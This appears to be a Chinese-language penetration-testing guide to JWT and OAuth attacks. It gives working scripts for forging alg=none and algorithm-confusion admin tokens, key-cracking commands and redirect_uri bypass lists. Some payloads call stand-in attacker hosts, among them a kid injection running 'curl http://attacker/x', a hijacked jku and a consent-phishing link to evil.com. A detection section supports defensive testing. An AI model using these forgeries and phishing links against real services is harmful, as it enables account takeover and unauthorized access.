# JWT 与 OAuth 测试：头部攻击面、claim 篡改、重定向绕过

> 被 `api-security` 引用。JWT 的测试不是"改 payload 看能不能过"，而是**先确定服务端
> 用哪个字段做信任决策**。OAuth 的测试不是"改 redirect_uri"，而是**找出哪一跳没有校验**。

## 一、JWT：先解构，再逐个字段试

```bash
# 0) 不装工具也能拆
python3 - <<'PY'
import base64, json, sys
t = sys.argv[1] if len(sys.argv) > 1 else open('/dev/stdin').read().strip()
h, p, s = t.split('.')
d = lambda x: json.loads(base64.urlsafe_b64decode(x + '=' * (-len(x) % 4)))
print('HEADER ', json.dumps(d(h), ensure_ascii=False))
print('PAYLOAD', json.dumps(d(p), ensure_ascii=False))
print('SIGLEN ', len(base64.urlsafe_b64decode(s + '=' * (-len(s) % 4))))
PY "$TOKEN"
```

```bash
# jwt_tool 全量扫（推荐，先跑一遍拿全景）
pip install jwt-tool
python3 jwt_tool.py "$TOKEN" -M at -t https://api.example.com/api/v1/me
```

### 1. 头部攻击（按成功率排序）

| 手法 | 构造 | 生效条件 | 检测信号 |
| --- | --- | --- | --- |
| **alg=none** | `{"alg":"none","typ":"JWT"}` + 空签名（末尾保留 `.`） | 库配置 `verify_signature=False` 或显式允许 none | 无签名验证日志；高权请求成功 |
| **算法混淆 RS256→HS256** | `{"alg":"HS256"}`，用**公钥字节**做 HMAC 密钥 | 库按 header 的 alg 选算法（老版 jsonwebtoken / PyJWT<2） | 同一 kid 出现两种 alg |
| **alg=HS256 + 空密钥** | HMAC 密钥 = `""` 或 `"secret"` | 硬编码弱密钥 | — |
| **kid 注入（路径穿越）** | `{"kid":"../../../../dev/null"}` | kid 被拼进文件路径取密钥 | 文件系统错误；500 |
| **kid 注入（SQL）** | `{"kid":"x' UNION SELECT 'attackerkey'-- -"}` | kid 进 SQL 查密钥表 | DB 报错日志 |
| **kid 注入（命令）** | `{"kid":"a|curl http://attacker/x"}` | kid 进 shell | 出网连接 |
| **jku/x5u 劫持** | `{"jku":"https://attacker/jwks.json"}` | 服务端无条件信任 token 里的 jku | 出站请求到非白名单域 |
| **jwk 内嵌** | `{"jwk":{...自签公钥...}}` | 服务端用 token 自带 jwk 验签 | 请求体含 jwk 头部 |
| **typ 混淆** | `{"typ":"at+jwt"}` ↔ `{"typ":"JWT"}` | 不同服务按 typ 分流校验 | — |

**alg=none 构造（手工，最可靠）**：

```bash
python3 - <<'PY' > none.txt
import base64, json
b = lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=').decode()
h = b({"alg":"none","typ":"JWT"})
p = b({"sub":"admin","role":"admin","iat":1700000000,"exp":2000000000})
print(h + "." + p + ".")
PY
TOK=$(cat none.txt)
curl -i -s https://api.example.com/api/v1/admin/users -H "Authorization: Bearer $TOK"
```

变体全试一遍（不同库对 none 的写法容忍度不同）：`none` / `None` / `NONE` / `nOnE`。

**算法混淆（RS256→HS256）**：

```bash
# 1) 拿公钥（常见于 /jwks.json、/.well-known/jwks.json、TLS 证书、源码）
curl -s https://api.example.com/.well-known/jwks.json | jq .
# JWKS 里的 n/e 要转成 PEM
python3 - <<'PY'
import json, base64
from Crypto.PublicKey import RSA
j = json.load(open('jwks.json'))['keys'][0]
n = int.from_bytes(base64.urlsafe_b64decode(j['n']+'=='), 'big')
e = int.from_bytes(base64.urlsafe_b64decode(j['e']+'=='), 'big')
open('pub.pem','wb').write(RSA.construct((n,e)).publickey().export_key())
PY

# 2) 用公钥 PEM 的原始字节做 HMAC 密钥
python3 - <<'PY'
import hmac, hashlib, base64, json
key = open('pub.pem','rb').read()
b = lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=').decode()
h = b({"alg":"HS256","typ":"JWT"})
p = b({"sub":"admin","role":"admin"})
sig = base64.urlsafe_b64encode(hmac.new(key, (h+"."+p).encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
print(h+"."+p+"."+sig)
PY
```

### 2. Claim 篡改（先确定哪个 claim 被信任）

```bash
# 用 jwt_tool 一次改多个 claim 并重放
python3 jwt_tool.py "$TOKEN" -T \
  -p '{"sub":"admin","role":"admin","is_admin":true,"tenant_id":"t-0001","email_verified":true}' \
  -t https://api.example.com/api/v1/me
```

**关键：不是所有 claim 篡改都需要签名。** 如果服务端验签但**不校验 `iss`/`aud`**，可以用
另一个服务的合法 token（同签名密钥）打过来——见 `competition-jwt-claim-confusion`。

必试 claim 清单：

| claim | 改成什么 | 为什么可能生效 |
| --- | --- | --- |
| `sub` | 别人的用户 ID / `admin` | 服务端直接当主键用，不查库 |
| `role`/`roles`/`scope` | `admin`、`*` | 授权决策直接读 claim |
| `tenant`/`org`/`tid` | 别的租户 | 多租户隔离靠 claim |
| `exp` | 未来 / 删除 | 缺失 exp 时很多库默认不过期 |
| `iat`/`nbf` | 过去 | 时钟偏移容忍窗口内 |
| `aud` | 目标服务 | 服务端没校验 aud |
| `iss` | 自己搭的 IdP | 服务端没校验 iss 或用前缀匹配 |

**删除 claim 比改 claim 更常见有效**：删掉 `role` → 服务端走 "default = admin" 的分支；
删掉 `exp` → 永不过期；删掉 `aud` → 跳过受众检查。

### 3. 签名相关的其他断点

| 断点 | 测法 | 说明 |
| --- | --- | --- |
| 未验签的端 | 把签名改成 `AAAA` | 某些 `/internal/*` 只解 payload |
| 密钥爆破 | `hashcat -m 16500` 或 `jwt_tool -C -d rockyou.txt` | HS256 弱密钥 |
| 过期 token 仍可用 | 用 `exp` 已过的 token | 缓存/黑名单缺失 |
| 登出未失效 | 登出后重放旧 token | 无状态 JWT 的经典问题 |
| 密钥轮换缺失 | 用旧 kid 的 token | kid 不存在时回退到默认密钥 |

```bash
# HS256 密钥爆破
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
# 或用 jwt_tool
python3 jwt_tool.py "$TOKEN" -C -d /usr/share/wordlists/rockyou.txt
```

## 二、OAuth 2.0 / OIDC：找没校验的那一跳

### 1. redirect_uri 绕过的六种形态

假设注册的合法回调是 `https://app.example.com/callback`：

```
# ① 前缀匹配（服务端用 startsWith）
https://app.example.com/callback.evil.com
https://app.example.com/callback/../../evil

# ② 子路径（服务端用 startsWith 且没校验尾部分隔）
https://app.example.com/callback/evil
https://app.example.com/callback?next=https://evil.com

# ③ 子域（服务端只校验主域）
https://app.example.com.evil.com/callback
https://evil.app.example.com/callback   # 若能控制该子域

# ④ 开放重定向二次跳（最实用，通常不需要改 redirect_uri）
https://app.example.com/callback?redirect=https://evil.com
# 前提：callback 页存在开放重定向

# ⑤ 路径穿越 / 编码
https://app.example.com/callback/../evil
https://app.example.com/%2F%2E%2E%2Fevil
https://app.example.com/callback%00.evil.com

# ⑥ 端口/协议变体（localhost 类客户端常见）
http://localhost:8080/callback   # 若注册的是 https，http 可能被允许
https://localhost.evil.com/callback
```

```bash
# 自动跑 redirect_uri 绕过字典（用 ffuf 打 authorize 端点）
ffuf -u 'https://idp.example.com/oauth/authorize?response_type=code&client_id=CLIENT&scope=openid&redirect_uri=FUZZ' \
  -w redirect_bypass.txt -mc 301,302 -fr 'error=invalid_request' \
  -H 'Cookie: session=...' -t 10
```

`redirect_bypass.txt` 里每个变体用 `https%3A%2F%2Fapp.example.com%2Fcallback` 编码，
并同时试**不编码**的形态（有些 IdP 对两者解析不同）。

**判定成功的标志**：302 的 `Location` 指向**你自己的域**且带 `?code=`。只跳到错误页不算。

### 2. state / PKCE 缺失

| 缺失项 | 后果 | 验证方法 |
| --- | --- | --- |
| `state` 不校验 | CSRF 式账号绑定（login CSRF） | 用自己的 code 拼攻击者的 state，看是否接受 |
| `state` 可预测 | 同上，且可离线构造 | 连续取 20 个 state 看是否递增/时间戳 |
| PKCE 缺失 | 授权码可被截获后任意兑换 | 用另一个 client 的 verifier 兑换 |
| PKCE `plain` 降级 | verifier == challenge，截获即用 | 发 `code_challenge_method=plain` |
| PKCE 不校验 | 发任意 verifier 也能换 token | 换一个随机 verifier 试 |

```bash
# state 不校验：拿自己的 code，换个 state 再回调
curl -i -s "https://app.example.com/callback?code=OWN_CODE&state=ATTACKER_STATE"
# 若返回 302 到已登录页 / 设置会话 cookie → 命中

# PKCE 不校验：兑 code 时给错的 verifier
curl -s -X POST https://idp.example.com/oauth/token \
  -d 'grant_type=authorization_code&code=CODE&redirect_uri=https://app.example.com/callback' \
  -d 'client_id=CLIENT&code_verifier=WRONG_VERIFIER_43CHARS_AAAAAAAAAAAAAAAA'
# 返回 access_token → PKCE 形同虚设
```

### 3. 隐式流与 token 泄露路径

隐式流（`response_type=token`）的 token 直接在 fragment 里：

```
https://app.example.com/callback#access_token=...&token_type=Bearer&expires_in=3600
```

泄露路径（按实战优先级）：

| 路径 | 怎么打 | 说明 |
| --- | --- | --- |
| Referer 泄露 | callback 页里放外链/图片 | fragment 不进 Referer，但若 JS 把它写进 query 就会 |
| 开放重定向 | `?next=` 跳到外域 | fragment 会跟到外域 |
| 浏览器历史/缓存 | 共享终端 | 取证类 |
| 日志 | 反向代理记录完整 URL | fragment 通常不记，但 `response_mode=query` 会 |
| postMessage 泄露 | 父窗口 `*` 通配 | SPA 常见 |

**`response_mode=query` 是一个常被忽略的开关**：OIDC 允许把 `code`/`token` 放在 query，
这样会进 Referer 和代理日志。

### 4. 客户端凭证与同意钓鱼

```bash
# client_secret 泄露后的直接利用
curl -s -X POST https://idp.example.com/oauth/token \
  -d 'grant_type=client_credentials&client_id=CLIENT&client_secret=SECRET' \
  -d 'scope=admin:read admin:write'
# 若返回 token 且 scope 未按 client 注册范围裁剪 → scope 提升

# 同意钓鱼（consent phishing）：把自己的恶意 client 的授权链接发给受害者
https://idp.example.com/oauth/authorize?client_id=EVIL_CLIENT&redirect_uri=https://evil.com/cb&scope=openid+profile+email+offline_access&response_type=code
# offline_access 会拿到 refresh_token，长期有效
```

判定：受害者点完后，攻击者拿到 code → 换 token → 以受害者身份访问。这是**真实的账号接管**，
不是"看起来像钓鱼"。

### 5. token 交换与 refresh 链

```bash
# code 交换（注意 redirect_uri 必须与 authorize 时完全一致）
curl -s -X POST https://idp.example.com/oauth/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'grant_type=authorization_code' \
  -d 'code=CODE' \
  -d 'redirect_uri=https://app.example.com/callback' \
  -d 'client_id=CLIENT' -d 'client_secret=SECRET'

# refresh 链（refresh_token 是否轮换、旧的能否复用）
curl -s -X POST https://idp.example.com/oauth/token \
  -d 'grant_type=refresh_token&refresh_token=RT&client_id=CLIENT&client_secret=SECRET'
# 连续用同一个 RT 两次：第二次仍成功 → 未轮换，长期可用
```

**code 复用**：同一个 code 用两次，第二次若仍成功 → 缺少 code 一次性校验（RFC 6749 要求必须拒）。

## 三、验伤：token 拿到 ≠ 有权限

| 结论 | 必须给 | 常见假象 |
| --- | --- | --- |
| alg=none 生效 | 高权端点返回**业务数据**（非空、含敏感字段） | 401/403；返回 `{"error":"unauthorized"}` 但 HTTP 200 |
| 算法混淆生效 | 同上，且能重复（换 claim 后仍 200） | 500（密钥长度不对，说明走到了 HMAC 分支但报错） |
| claim 篡改生效 | 权限真的变了（能调管理接口） | 接口 200 但只回显 token 里的 claim（自证） |
| redirect_uri 绕过 | 302 的 Location 落在**自己控制的域**且带 code | 302 到 IdP 自己的错误页；带 `error=` |
| state 不校验 | 用攻击者 state 完成登录并获得会话 | 只是跳过错误提示，未建立会话 |
| 隐式流泄露 | 实际收到 token 字符串（可解码出 header） | 只看到 `#` 后面是空的 |

**必须做的闭环**：拿到 token 后**用它去打一个需要目标权限的接口**。只展示 JWT 内容
（jwt.io 截图）不算证据。

```bash
# 闭环模板
TOKEN=...
curl -s https://api.example.com/api/v1/admin/users -H "Authorization: Bearer $TOKEN" \
  | jq -r '.users[] | "\(.email) \(.role)"' | head -5
# 输出真实用户名/邮箱 → 这才是验伤
```

## 四、检测视角

| 手法 | 日志 | 信号 |
| --- | --- | --- |
| alg=none | 应用认证日志 | `alg` 字段值为 none 的 token 被接受；签名验证分支未执行 |
| 算法混淆 | 应用日志 | 同一 kid 下 alg 从 RS256 变 HS256；验签失败率突增 |
| kid 注入 | 文件/DB/EDR | 文件读取路径含 `../`；SQL 错误里有 `UNION`；子进程拉起 curl |
| jku 劫持 | 出站流量 | 认证服务向非白名单域发起 HTTPS 请求 |
| claim 篡改 | 应用审计 | token 中 `role` 与 DB 中实际角色不一致（需交叉校验） |
| redirect_uri 绕过 | IdP 授权日志 | 授权请求的 `redirect_uri` 与 client 注册值不精确匹配；Location 指向未注册域 |
| state 缺失/复用 | IdP 日志 | 同一 state 出现两次；callback 的 state 不在会话里 |
| code 复用 | IdP token 端点 | 同一 code 两次兑换（应报 `invalid_grant`） |
| 同意钓鱼 | IdP 同意日志 | 新 client 首次授权 + 高 scope（`offline_access`、`admin`）+ 短时间大量用户 |
| 密码爆破走别名 | GraphQL 层 | 单请求内多 operation（见 rest-graphql-testing） |

**关键检测点**：IdP 侧绝大多数只记"授权成功"，不记 `redirect_uri` 是否精确匹配。要能检测
redirect 绕过，必须在 authorize 端点记录 **请求的 redirect_uri + client 注册的 redirect_uri +
是否精确匹配**三列。

## 五、常见坑

1. **改了 payload 没重签**——除了 alg=none，其他攻击都需要重新计算签名。用 `jwt_tool -T` 而不是手工 base64。
2. **RS256→HS256 用错了密钥形式**——必须是**公钥 PEM 文件的原始字节**（含 `-----BEGIN PUBLIC KEY-----` 头和换行），不是 base64 解出来的 DER。两种都试。
3. **redirect_uri 只看 302 状态码**——要看 `Location` 的 host。跳到 `https://idp/error?error=invalid_request` 是**没绕过**。
4. **忘记 redirect_uri 要 URL 编码**——很多 IdP 对 `%2F` 和 `/` 处理不同，两种都要试。
5. **OAuth 测完停在"拿到 code"**——code 不是身份，必须换 token 再打业务接口。中间任何一跳失败都要继续排（可能是 client_secret 错、redirect_uri 不匹配、code 已过期 60 秒）。
6. **PKCE 测试忘了 `code_challenge_method`**——发 `plain` 且 challenge==verifier 是降级点，但有些 IdP 只接受 `S256`，发了 plain 直接 400，那不是漏洞是配置正确。
7. **同意钓鱼的 scope 要写全**——`offline_access` 才是拿 refresh_token 的关键；只拿 `openid profile` 只能读基本信息，影响等级差很多。